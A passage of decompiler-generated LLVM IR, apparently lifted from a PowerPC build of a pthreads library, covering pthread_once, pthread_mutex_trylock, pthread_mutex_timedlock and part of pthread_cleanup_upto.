  %v1_100082c4 = add i32 %arg1, 8
  %v2_100082c4 = inttoptr i32 %v1_100082c4 to i32*
  %v3_100082c4 = load i32, i32* %v2_100082c4, align 4
  %v0_100082c8 = load i32, i32* @r2, align 4
  store i32 %v0_100082c8, i32* @r30, align 4
  store i32 35, i32* %r3.global-to-local, align 4
  %v4_100082d0 = icmp eq i32 %v3_100082c4, %v0_100082c8
  br i1 %v4_100082d0, label %dec_label_pc_10008300, label %dec_label_pc_100082d8

dec_label_pc_100082d8:                            ; preds = %dec_label_pc_100082c4
  %v1_100082d8 = add i32 %arg1, 16
  store i32 %v1_100082d8, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100082e4.319 to i32), i32* @lr, align 4
  %v2_100082e0 = inttoptr i32 %v1_100082d8 to i32*
  %v3_100082e0 = call i32 @__pthread_alt_lock(i32* %v2_100082e0, i32 %v0_100082c8)
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100082e8

dec_label_pc_100082e8:                            ; preds = %dec_label_pc_100082a8, %dec_label_pc_100082d8
  %v0_100082e8 = load i32, i32* @r30, align 4
  %v1_100082e8 = load i32, i32* @r31, align 4
  %v2_100082e8 = add i32 %v1_100082e8, 8
  %v3_100082e8 = inttoptr i32 %v2_100082e8 to i32*
  store i32 %v0_100082e8, i32* %v3_100082e8, align 4
  br label %dec_label_pc_10008300

dec_label_pc_100082f0:                            ; preds = %dec_label_pc_10008264
  %v1_100082f0 = add i32 %arg1, 16
  store i32 %v1_100082f0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100082fc.320 to i32), i32* @lr, align 4
  %v2_100082f8 = inttoptr i32 %v1_100082f0 to i32*
  %v3_100082f8 = call i32 @__pthread_alt_lock(i32* %v2_100082f8, i32 0)
  br label %dec_label_pc_100082fc

dec_label_pc_100082fc:                            ; preds = %dec_label_pc_10008274, %dec_label_pc_100082f0
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008300

dec_label_pc_10008300:                            ; preds = %dec_label_pc_100082c4, %dec_label_pc_100082e8, %dec_label_pc_10008294, %dec_label_pc_1000826c, %dec_label_pc_100082fc
  %v0_10008310 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10008310

; uselistorder directives
  uselistorder i32* %r3.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 9, 0 }
  uselistorder i32 %arg1, { 8, 0, 1, 6, 5, 2, 7, 4, 3, 9 }
  uselistorder label %dec_label_pc_10008300, { 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_100082fc, { 1, 0 }
  uselistorder label %dec_label_pc_100082e8, { 1, 0 }
  uselistorder label %dec_label_pc_1000826c, { 1, 0 }
}

define i32 @__pthread_once_fork_prepare(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1000831c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002f504.313 to i32))
  ret i32 %v1_1000831c
}

define i32 @pthread_once(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg2, i32* @r30, align 4
  %v2_10008338 = load i32, i32* %arg1, align 4
  %v3_1000833c = icmp eq i32 %v2_10008338, 2
  br i1 %v3_1000833c, label %dec_label_pc_10008438, label %dec_label_pc_1000834c

dec_label_pc_1000834c:                            ; preds = %entry
  store i32 268469080, i32* @lr, align 4
  %v1_10008354 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002f504.313 to i32))
  %v0_10008358 = load i32, i32* @r31, align 4
  %v1_10008358 = inttoptr i32 %v0_10008358 to i32*
  %v2_10008358 = load i32, i32* %v1_10008358, align 4
  store i32 %v2_10008358, i32* @r11, align 4
  %v1_1000835c = urem i32 %v2_10008358, 4
  %v3_10008360 = icmp eq i32 %v1_1000835c, 1
  br i1 %v3_10008360, label %dec_label_pc_10008368, label %dec_label_pc_1000838c.preheader

dec_label_pc_10008368:                            ; preds = %dec_label_pc_1000834c
  %v1_1000836c = call i32 @__asm_rlwinm(i32 %v2_10008358, i32 0, i32 0, i32 29)
  %v3_10008370 = load i32, i32* @global_var_1002f040.315, align 4
  %v4_10008374 = icmp eq i32 %v1_1000836c, %v3_10008370
  br i1 %v4_10008374, label %dec_label_pc_1000838c.preheader, label %dec_label_pc_1000837c

dec_label_pc_1000837c:                            ; preds = %dec_label_pc_10008368
  %v1_10008380 = load i32, i32* @r31, align 4
  %v2_10008380 = inttoptr i32 %v1_10008380 to i32*
  store i32 0, i32* %v2_10008380, align 4
  br label %dec_label_pc_1000838c.preheader

dec_label_pc_1000838c.preheader:                  ; preds = %dec_label_pc_1000837c, %dec_label_pc_10008368, %dec_label_pc_1000834c
  %v0_1000838c5 = load i32, i32* @r31, align 4
  %v1_1000838c6 = inttoptr i32 %v0_1000838c5 to i32*
  %v2_1000838c7 = load i32, i32* %v1_1000838c6, align 4
  store i32 %v2_1000838c7, i32* @r9, align 4
  %v1_1000839c8 = urem i32 %v2_1000838c7, 4
  %v3_100083a411 = icmp eq i32 %v1_1000839c8, 1
  br i1 %v3_100083a411, label %dec_label_pc_10008388, label %dec_label_pc_100083ac

dec_label_pc_10008388:                            ; preds = %dec_label_pc_1000838c.preheader, %dec_label_pc_10008388
  %v2_1000838c12 = phi i32 [ %v2_1000838c, %dec_label_pc_10008388 ], [ %v2_1000838c7, %dec_label_pc_1000838c.preheader ]
  store i32 268469132, i32* @lr, align 4
  %v3_10008388 = call i32 @__GI_pthread_cond_wait(i32 ptrtoint (i32* @global_var_1002f51c.314 to i32), i32 ptrtoint (i32* @global_var_1002f504.313 to i32), i32 %v2_1000838c12)
  %v0_1000838c = load i32, i32* @r31, align 4
  %v1_1000838c = inttoptr i32 %v0_1000838c to i32*
  %v2_1000838c = load i32, i32* %v1_1000838c, align 4
  store i32 %v2_1000838c, i32* @r9, align 4
  %v1_1000839c = urem i32 %v2_1000838c, 4
  %v3_100083a4 = icmp eq i32 %v1_1000839c, 1
  br i1 %v3_100083a4, label %dec_label_pc_10008388, label %dec_label_pc_100083ac

dec_label_pc_100083ac:                            ; preds = %dec_label_pc_10008388, %dec_label_pc_1000838c.preheader
  %v1_1000838c.lcssa = phi i32* [ %v1_1000838c6, %dec_label_pc_1000838c.preheader ], [ %v1_1000838c, %dec_label_pc_10008388 ]
  %v2_1000838c.lcssa = phi i32 [ %v2_1000838c7, %dec_label_pc_1000838c.preheader ], [ %v2_1000838c, %dec_label_pc_10008388 ]
  %v3_100083ac = icmp eq i32 %v2_1000838c.lcssa, 0
  store i32 0, i32* @r29, align 4
  br i1 %v3_100083ac, label %dec_label_pc_100083b8, label %dec_label_pc_10008418

dec_label_pc_100083b8:                            ; preds = %dec_label_pc_100083ac
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r9, align 4
  store i32 ptrtoint (i32* @global_var_1002f504.313 to i32), i32* @r3, align 4
  %v3_100083c0 = load i32, i32* @global_var_1002f040.315, align 4
  store i32 ptrtoint (i32* @global_var_1002f504.313 to i32), i32* @r29, align 4
  %v1_100083c8 = or i32 %v3_100083c0, 1
  store i32 %v1_100083c8, i32* %v1_1000838c.lcssa, align 4
  store i32 268469204, i32* @lr, align 4
  %v0_100083d0 = call i32 @pthread_mutex_unlock()
  %v2_100083d8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_100083d8, i32* @r28, align 4
  %v0_100083dc = load i32, i32* @r31, align 4
  %v4_100083e8 = call i32 @_pthread_cleanup_push(i32* nonnull %stack_var_-40, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -31664), i32 %v0_100083dc)
  %v0_100083ec = load i32, i32* @r30, align 4
  call void @__pseudo_call(i32 %v0_100083ec)
  store i32 268469248, i32* @lr, align 4
  %v3_100083fc = call i32 @_pthread_cleanup_pop(i32* nonnull %stack_var_-40, i32 0)
  %v0_10008400 = load i32, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10008408.321 to i32), i32* @lr, align 4
  %v1_10008404 = call i32 @pthread_mutex_lock(i32 %v0_10008400)
  store i32 1, i32* @r29, align 4
  %v1_10008414 = load i32, i32* @r31, align 4
  %v2_10008414 = inttoptr i32 %v1_10008414 to i32*
  store i32 2, i32* %v2_10008414, align 4
  br label %dec_label_pc_10008418

dec_label_pc_10008418:                            ; preds = %dec_label_pc_100083ac, %dec_label_pc_100083b8
  store i32 ptrtoint (i32* @global_var_1002f504.313 to i32), i32* @r3, align 4
  store i32 268469284, i32* @lr, align 4
  %v0_10008420 = call i32 @pthread_mutex_unlock()
  %v0_10008424 = load i32, i32* @r29, align 4
  %v3_10008424 = icmp eq i32 %v0_10008424, 0
  br i1 %v3_10008424, label %dec_label_pc_10008438, label %dec_label_pc_1000842c

dec_label_pc_1000842c:                            ; preds = %dec_label_pc_10008418
  store i32 268469304, i32* @lr, align 4
  %v1_10008434 = call i32 @pthread_cond_broadcast(i32 ptrtoint (i32* @global_var_1002f51c.314 to i32))
  br label %dec_label_pc_10008438

dec_label_pc_10008438:                            ; preds = %entry, %dec_label_pc_10008418, %dec_label_pc_1000842c
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_1000838c, { 1, 0, 3, 2 }
  uselistorder i32 %v2_1000838c7, { 1, 2, 0, 3 }
  uselistorder i32 %v2_10008358, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 1, 0, 2 }
  uselistorder i32* @global_var_1002f040.315, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_10008438, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10008418, { 1, 0 }
  uselistorder label %dec_label_pc_10008388, { 1, 0 }
}

define i32 @pthread_once_cancelhandler(i32* %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_1002f504.313 to i32), i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10008474.322 to i32), i32* @lr, align 4
  %v1_10008470 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002f504.313 to i32))
  store i32 0, i32* %arg1, align 4
  %v0_1000847c = load i32, i32* @r29, align 4
  store i32 %v0_1000847c, i32* @r3, align 4
  store i32 268469380, i32* @lr, align 4
  %v0_10008480 = call i32 @pthread_mutex_unlock()
  store i32 268469392, i32* @lr, align 4
  %v1_1000848c = call i32 @pthread_cond_broadcast(i32 ptrtoint (i32* @global_var_1002f51c.314 to i32))
  ret i32 %v1_1000848c

; uselistorder directives
  uselistorder i32 (i32)* @pthread_cond_broadcast, { 1, 0 }
  uselistorder i32* @global_var_1002f51c.314, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002f51c.314 to i32), { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002f504.313 to i32), { 3, 7, 8, 2, 1, 0, 4, 5, 9, 6 }
}

define i32 @pthread_mutex_trylock(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r31, align 4
  %v1_100084b8 = add i32 %arg1, 12
  %v2_100084b8 = inttoptr i32 %v1_100084b8 to i32*
  %v3_100084b8 = load i32, i32* %v2_100084b8, align 4
  %v3_100084bc = icmp eq i32 %v3_100084b8, 1
  br i1 %v3_100084bc, label %dec_label_pc_10008504, label %dec_label_pc_100084c4

dec_label_pc_100084c4:                            ; preds = %entry
  %v2_100084bc = icmp sgt i32 %v3_100084b8, 1
  br i1 %v2_100084bc, label %dec_label_pc_100084d4, label %dec_label_pc_100084c8

dec_label_pc_100084c8:                            ; preds = %dec_label_pc_100084c4
  %v3_100084c8 = icmp eq i32 %v3_100084b8, 0
  br i1 %v3_100084c8, label %dec_label_pc_100084ec, label %dec_label_pc_100084e4

dec_label_pc_100084d4:                            ; preds = %dec_label_pc_100084c4
  %v3_100084d4 = icmp eq i32 %v3_100084b8, 2
  br i1 %v3_100084d4, label %dec_label_pc_10008544, label %dec_label_pc_100084dc

dec_label_pc_100084dc:                            ; preds = %dec_label_pc_100084d4
  %v3_100084dc = icmp eq i32 %v3_100084b8, 3
  br i1 %v3_100084dc, label %dec_label_pc_1000855c, label %dec_label_pc_100084e4

dec_label_pc_100084e4:                            ; preds = %dec_label_pc_100084c8, %dec_label_pc_100084dc
  store i32 22, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008574

dec_label_pc_100084ec:                            ; preds = %dec_label_pc_100084c8
  %v1_100084f0 = add i32 %arg1, 16
  store i32 %v1_100084f0, i32* %r3.global-to-local, align 4
  %v1_10008500 = inttoptr i32 %v1_100084f0 to i32*
  %v2_10008500 = call i32 @__pthread_trylock(i32* %v1_10008500)
  store i32 %v2_10008500, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008504

dec_label_pc_10008504:                            ; preds = %entry, %dec_label_pc_100084ec
  %v0_10008514 = phi i32 [ %arg1, %entry ], [ %v2_10008500, %dec_label_pc_100084ec ]
  %v1_10008504 = add i32 %v0_10008514, 8
  %v2_10008504 = inttoptr i32 %v1_10008504 to i32*
  %v3_10008504 = load i32, i32* %v2_10008504, align 4
  %v0_10008508 = load i32, i32* @r2, align 4
  store i32 %v0_10008508, i32* @r30, align 4
  %v4_1000850c = icmp eq i32 %v3_10008504, %v0_10008508
  br i1 %v4_1000850c, label %dec_label_pc_10008514, label %dec_label_pc_10008528

dec_label_pc_10008514:                            ; preds = %dec_label_pc_10008504
  %v1_10008514 = add i32 %v0_10008514, 4
  %v2_10008514 = inttoptr i32 %v1_10008514 to i32*
  %v3_10008514 = load i32, i32* %v2_10008514, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000851c = add i32 %v3_10008514, 1
  %v1_10008520 = load i32, i32* @r31, align 4
  %v2_10008520 = add i32 %v1_10008520, 4
  %v3_10008520 = inttoptr i32 %v2_10008520 to i32*
  store i32 %v1_1000851c, i32* %v3_10008520, align 4
  br label %dec_label_pc_10008574

dec_label_pc_10008528:                            ; preds = %dec_label_pc_10008504
  %v1_10008528 = add i32 %v0_10008514, 16
  store i32 %v1_10008528, i32* %r3.global-to-local, align 4
  %v1_1000852c = inttoptr i32 %v1_10008528 to i32*
  %v2_1000852c = call i32 @__pthread_trylock(i32* %v1_1000852c)
  store i32 %v2_1000852c, i32* %r3.global-to-local, align 4
  %v3_10008530 = icmp eq i32 %v2_1000852c, 0
  br i1 %v3_10008530, label %dec_label_pc_10008538, label %dec_label_pc_10008574

dec_label_pc_10008538:                            ; preds = %dec_label_pc_10008528
  %v0_10008538 = load i32, i32* @r30, align 4
  %v1_10008538 = load i32, i32* @r31, align 4
  %v2_10008538 = add i32 %v1_10008538, 8
  %v3_10008538 = inttoptr i32 %v2_10008538 to i32*
  store i32 %v0_10008538, i32* %v3_10008538, align 4
  %v0_1000853c = load i32, i32* %r3.global-to-local, align 4
  %v1_1000853c = load i32, i32* @r31, align 4
  %v2_1000853c = add i32 %v1_1000853c, 4
  %v3_1000853c = inttoptr i32 %v2_1000853c to i32*
  store i32 %v0_1000853c, i32* %v3_1000853c, align 4
  br label %dec_label_pc_10008574

dec_label_pc_10008544:                            ; preds = %dec_label_pc_100084d4
  %v1_10008544 = add i32 %arg1, 16
  store i32 %v1_10008544, i32* %r3.global-to-local, align 4
  %v1_10008548 = inttoptr i32 %v1_10008544 to i32*
  %v2_10008548 = call i32 @__pthread_alt_trylock(i32* %v1_10008548)
  store i32 %v2_10008548, i32* %r3.global-to-local, align 4
  %v3_1000854c = icmp eq i32 %v2_10008548, 0
  br i1 %v3_1000854c, label %dec_label_pc_10008554, label %dec_label_pc_10008574

dec_label_pc_10008554:                            ; preds = %dec_label_pc_10008544
  %v0_10008554 = load i32, i32* @r2, align 4
  %v1_10008554 = load i32, i32* @r31, align 4
  %v2_10008554 = add i32 %v1_10008554, 8
  %v3_10008554 = inttoptr i32 %v2_10008554 to i32*
  store i32 %v0_10008554, i32* %v3_10008554, align 4
  br label %dec_label_pc_10008574

dec_label_pc_1000855c:                            ; preds = %dec_label_pc_100084dc
  %v1_10008560 = add i32 %arg1, 16
  store i32 %v1_10008560, i32* %r3.global-to-local, align 4
  %v1_10008570 = inttoptr i32 %v1_10008560 to i32*
  %v2_10008570 = call i32 @__pthread_alt_trylock(i32* %v1_10008570)
  store i32 %v2_10008570, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008574

dec_label_pc_10008574:                            ; preds = %dec_label_pc_10008544, %dec_label_pc_10008528, %dec_label_pc_10008554, %dec_label_pc_10008538, %dec_label_pc_10008514, %dec_label_pc_100084e4, %dec_label_pc_1000855c
  %v0_10008584 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10008584

; uselistorder directives
  uselistorder i32 %v0_10008514, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 11, 3, 4, 5, 6, 1, 2, 8, 7, 9, 10, 12, 0 }
  uselistorder i32 (i32*)* @__pthread_trylock, { 1, 0 }
  uselistorder i32 %arg1, { 3, 4, 5, 2, 1, 0, 6 }
  uselistorder label %dec_label_pc_10008574, { 6, 2, 0, 3, 1, 4, 5 }
  uselistorder label %dec_label_pc_10008504, { 1, 0 }
  uselistorder label %dec_label_pc_100084e4, { 1, 0 }
}

define i32 @pthread_mutex_timedlock(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_100085a4 = add i32 %arg2, 4
  %v2_100085a4 = inttoptr i32 %v1_100085a4 to i32*
  %v3_100085a4 = load i32, i32* %v2_100085a4, align 4
  %v3_100085a8 = icmp ugt i32 %v3_100085a4, 999999999
  br i1 %v3_100085a8, label %dec_label_pc_1000868c, label %dec_label_pc_100085b0

dec_label_pc_100085b0:                            ; preds = %entry
  %v1_100085b0 = add i32 %arg1, 12
  %v2_100085b0 = inttoptr i32 %v1_100085b0 to i32*
  %v3_100085b0 = load i32, i32* %v2_100085b0, align 4
  %v3_100085b4 = icmp eq i32 %v3_100085b0, 1
  br i1 %v3_100085b4, label %dec_label_pc_100085f4, label %dec_label_pc_100085bc

dec_label_pc_100085bc:                            ; preds = %dec_label_pc_100085b0
  %v2_100085b4 = icmp sgt i32 %v3_100085b0, 1
  br i1 %v2_100085b4, label %dec_label_pc_100085cc, label %dec_label_pc_100085c0

dec_label_pc_100085c0:                            ; preds = %dec_label_pc_100085bc
  %v3_100085c0 = icmp eq i32 %v3_100085b0, 0
  br i1 %v3_100085c0, label %dec_label_pc_100085e0, label %dec_label_pc_1000868c

dec_label_pc_100085cc:                            ; preds = %dec_label_pc_100085bc
  %v3_100085cc = icmp eq i32 %v3_100085b0, 2
  br i1 %v3_100085cc, label %dec_label_pc_10008634, label %dec_label_pc_100085d4

dec_label_pc_100085d4:                            ; preds = %dec_label_pc_100085cc
  %v3_100085d4 = icmp eq i32 %v3_100085b0, 3
  br i1 %v3_100085d4, label %dec_label_pc_1000866c, label %dec_label_pc_1000868c

dec_label_pc_100085e0:                            ; preds = %dec_label_pc_100085c0
  %v1_100085e0 = add i32 %arg1, 16
  store i32 %v1_100085e0, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100085ec.323 to i32), i32* @lr, align 4
  %v0_100085e8 = call i32 @__pthread_lock()
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008698

dec_label_pc_100085f4:                            ; preds = %dec_label_pc_100085b0
  %v1_100085f4 = add i32 %arg1, 8
  %v2_100085f4 = inttoptr i32 %v1_100085f4 to i32*
  %v3_100085f4 = load i32, i32* %v2_100085f4, align 4
  %v0_100085f8 = load i32, i32* @r2, align 4
  %v4_100085fc = icmp eq i32 %v3_100085f4, %v0_100085f8
  br i1 %v4_100085fc, label %dec_label_pc_10008604, label %dec_label_pc_10008618

dec_label_pc_10008604:                            ; preds = %dec_label_pc_100085f4
  %v1_10008604 = add i32 %arg1, 4
  %v2_10008604 = inttoptr i32 %v1_10008604 to i32*
  %v3_10008604 = load i32, i32* %v2_10008604, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000860c = add i32 %v3_10008604, 1
  store i32 %v1_1000860c, i32* %v2_10008604, align 4
  br label %dec_label_pc_10008698

dec_label_pc_10008618:                            ; preds = %dec_label_pc_100085f4
  %v1_10008618 = add i32 %arg1, 16
  store i32 %v1_10008618, i32* @r3, align 4
  store i32 %v0_100085f8, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_10008624.324 to i32), i32* @lr, align 4
  %v0_10008620 = call i32 @__pthread_lock()
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000862c = load i32, i32* @r31, align 4
  %v2_1000862c = add i32 %v1_1000862c, 4
  %v3_1000862c = inttoptr i32 %v2_1000862c to i32*
  store i32 0, i32* %v3_1000862c, align 4
  br label %dec_label_pc_10008664

dec_label_pc_10008634:                            ; preds = %dec_label_pc_100085cc
  %v1_10008634 = add i32 %arg1, 8
  %v2_10008634 = inttoptr i32 %v1_10008634 to i32*
  %v3_10008634 = load i32, i32* %v2_10008634, align 4
  %v0_10008638 = load i32, i32* @r2, align 4
  store i32 35, i32* %r3.global-to-local, align 4
  %v4_10008640 = icmp eq i32 %v3_10008634, %v0_10008638
  br i1 %v4_10008640, label %dec_label_pc_10008698, label %dec_label_pc_10008648

dec_label_pc_10008648:                            ; preds = %dec_label_pc_10008634
  %v1_1000864c = add i32 %arg1, 16
  store i32 %v1_1000864c, i32* %r3.global-to-local, align 4
  store i32 268469848, i32* @lr, align 4
  %v4_10008654 = inttoptr i32 %v1_1000864c to i32*
  %v5_10008654 = call i32 @__pthread_alt_timedlock(i32* %v4_10008654, i32 %v0_10008638, i32 %arg2, i32 999999999)
  store i32 %v5_10008654, i32* %r3.global-to-local, align 4
  %v3_10008658 = icmp eq i32 %v5_10008654, 0
  br i1 %v3_10008658, label %dec_label_pc_10008694, label %dec_label_pc_10008660

dec_label_pc_10008660:                            ; preds = %dec_label_pc_10008648
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008664

dec_label_pc_10008664:                            ; preds = %dec_label_pc_10008618, %dec_label_pc_10008660
  %v0_10008664 = load i32, i32* @r30, align 4
  %v1_10008664 = load i32, i32* @r31, align 4
  %v2_10008664 = add i32 %v1_10008664, 8
  %v3_10008664 = inttoptr i32 %v2_10008664 to i32*
  store i32 %v0_10008664, i32* %v3_10008664, align 4
  br label %dec_label_pc_10008698

dec_label_pc_1000866c:                            ; preds = %dec_label_pc_100085d4
  %v1_10008670 = add i32 %arg1, 16
  store i32 %v1_10008670, i32* %r3.global-to-local, align 4
  store i32 268469884, i32* @lr, align 4
  %v4_10008678 = inttoptr i32 %v1_10008670 to i32*
  %v5_10008678 = call i32 @__pthread_alt_timedlock(i32* %v4_10008678, i32 0, i32 %arg2, i32 999999999)
  %v3_1000867c = icmp eq i32 %v5_10008678, 0
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_1000867c, label %dec_label_pc_10008694, label %dec_label_pc_10008698

dec_label_pc_1000868c:                            ; preds = %dec_label_pc_100085c0, %dec_label_pc_100085d4, %entry
  store i32 22, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008698

dec_label_pc_10008694:                            ; preds = %dec_label_pc_1000866c, %dec_label_pc_10008648
  store i32 110, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008698

dec_label_pc_10008698:                            ; preds = %dec_label_pc_1000866c, %dec_label_pc_10008634, %dec_label_pc_1000868c, %dec_label_pc_10008664, %dec_label_pc_10008604, %dec_label_pc_100085e0, %dec_label_pc_10008694
  %v0_100086a8 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100086a8

; uselistorder directives
  uselistorder i32* %r3.global-to-local, { 11, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 0 }
  uselistorder i32 999999999, { 2, 0, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i32 %arg1, { 5, 0, 3, 2, 1, 7, 4, 6, 8 }
  uselistorder label %dec_label_pc_10008698, { 6, 2, 0, 3, 1, 4, 5 }
  uselistorder label %dec_label_pc_1000868c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10008664, { 1, 0 }
}

define i32 @pthread_cleanup_upto() local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100086b0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100086b0, i32* %stack_var_-32, align 4
  %v5_100086b0 = ptrtoint i32* %stack_var_-32 to i32
  %v0_100086b8 = load i32, i32* @r2, align 4
  store i32 %v0_100086b8, i32* %r30.global-to-local, align 4
  %v0_100086c0 = load i32, i32* @r3, align 4
  store i32 %v0_100086c0, i32* @r28, align 4
  store i32 %v5_100086b0, i32* @r29, align 4
  %v1_100086c8 = add i32 %v0_100086b8, 60
  %storemerge.in11 = inttoptr i32 %v1_100086c8 to i32*
  %storemerge12 = load i32, i32* %storemerge.in11, align 4
  store i32 %storemerge12, i32* %r31.global-to-local, align 4
  %v3_100086f015 = icmp eq i32 %storemerge12, 0
  %v3_100086f417 = icmp ugt i32 %storemerge12, %v5_100086b0
  br i1 %v3_100086f015, label %dec_label_pc_10008708, label %dec_label_pc_100086fc

dec_label_pc_100086d0:                            ; preds = %dec_label_pc_100086fc
  br i1 %v3_100086f421, label %dec_label_pc_100086dc, label %dec_label_pc_100086d4

dec_label_pc_100086d4:                            ; preds = %dec_label_pc_100086d0
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008708

dec_label_pc_100086dc:                            ; preds = %dec_label_pc_100086d0
  %v1_100086dc = inttoptr i32 %storemerge20 to i32*
  %v2_100086dc = load i32, i32* %v1_100086dc, align 4
  %v1_100086e0 = add i32 %storemerge20, 4
  %v2_100086e0 = inttoptr i32 %v1_100086e0 to i32*
  %v3_100086e0 = load i32, i32* %v2_100086e0, align 4
  call void @__pseudo_call(i32 %v2_100086dc)
  %v0_100086ec = load i32, i32* %r31.global-to-local, align 4
  %v1_100086ec = add i32 %v0_100086ec, 12
  %v1_100086f4.pre = load i32, i32* @r29, align 4
  %storemerge.in = inttoptr i32 %v1_100086ec to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  %v3_100086f0 = icmp eq i32 %storemerge, 0
  br i1 %v3_100086f0, label %dec_label_pc_10008708, label %dec_label_pc_100086dc.dec_label_pc_100086fc_crit_edge

dec_label_pc_100086dc.dec_label_pc_100086fc_crit_edge: ; preds = %dec_label_pc_100086dc
  %v3_100086f4 = icmp ugt i32 %storemerge, %v1_100086f4.pre
  %v0_100086fc.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_100086fc

dec_label_pc_100086fc:                            ; preds = %entry, %dec_label_pc_100086dc.dec_label_pc_100086fc_crit_edge
  %v0_100086fc = phi i32 [ %v0_100086fc.pre, %dec_label_pc_100086dc.dec_label_pc_100086fc_crit_edge ], [ %v0_100086c0, %entry ]
  %v3_100086f421 = phi i1 [ %v3_100086f4, %dec_label_pc_100086dc.dec_label_pc_100086fc_crit_edge ], [ %v3_100086f417, %entry ]
  %storemerge20 = phi i32 [ %storemerge, %dec_label_pc_100086dc.dec_label_pc_100086fc_crit_edge ], [ %storemerge12, %entry ]
  %.019 = phi i32 [ %v3_100086e0, %dec_label_pc_100086dc.dec_label_pc_100086fc_crit_edge ], [ undef, %entry ]
  %v1_100086fc = inttoptr i32 %v0_100086fc to i32*
  %v2_100086fc = load i32, i32* %v1_100086fc, align 4
  %v2_10008700 = icmp ult i32 %storemerge20, %v2_100086fc
  br i1 %v2_10008700, label %dec_label_pc_100086d0, label %dec_label_pc_10008708

dec_label_pc_10008708:                            ; preds = %entry, %dec_label_pc_100086dc, %dec_label_pc_100086fc, %dec_label_pc_100086d4
  %.010 = phi i32 [ %.019, %dec_label_pc_100086d4 ], [ undef, %entry ], [ %v3_100086e0, %dec_label_pc_100086dc ], [ %.019, %dec_label_pc_100086fc ]
  %v0_1000870c = phi i32 [ 0, %dec_label_pc_100086d4 ], [ 0, %entry ], [ 0, %dec_label_pc_100086dc ], [ %storemerge20, %dec_label_pc_100086fc ]
  %v0_10008708 = load i32, i32* %r30.global-to-local, align 4
  %v1_10008708 = add i32 %v0_10008708, 84
  %v2_10008708 = inttoptr i32 %v1_10008708 to i32*
  %v3_10008708 = load i32, i32* %v2_10008708, align 4
  store i32 %v3_10008708, i32* %r9.global-to-local, align 4
  %v2_1000870c = add i32 %v0_10008708, 60
  %v3_1000870c = inttoptr i32 %v2_1000870c to i32*
  store i32 %v0_1000870c, i32* %v3_1000870c, align 4
  %v0_10008710 = load i32, i32* %r9.global-to-local, align 4
  %v3_10008710 = icmp eq i32 %v0_10008710, 0
  br i1 %v3_10008710, label %dec_label_pc_1000872c, label %dec_label_pc_10008718

dec_label_pc_10008718:                            ; preds = %dec_label_pc_10008708
  %v0_10008718 = load i32, i32* @r28, align 4
  %v1_10008718 = inttoptr i32 %v0_10008718 to i32*
  %v2_10008718 = load i32, i32* %v1_10008718, align 4
  %v2_1000871c = icmp ult i32 %v0_10008710, %v2_10008718
  br i1 %v2_1000871c, label %dec_label_pc_10008724, label %dec_label_pc_1000872c

dec_label_pc_10008724:                            ; preds = %dec_label_pc_10008718
  %v1_10008728 = load i32, i32* %r30.global-to-local, align 4
  %v2_10008728 = add i32 %v1_10008728, 84
  %v3_10008728 = inttoptr i32 %v2_10008728 to i32*
